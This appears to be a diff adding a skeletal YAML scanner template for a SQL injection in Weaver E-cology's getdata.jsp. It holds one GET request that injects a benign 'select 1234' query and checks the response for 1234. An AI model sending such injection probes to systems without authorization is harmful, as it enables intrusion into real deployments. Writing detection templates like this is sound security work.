@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 泛微E-cology getdata.jsp SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201234%20as%20id
+  headers:
+response1:
+  headers:
+  body: 1234
+  code:
+requests2:
+response2:
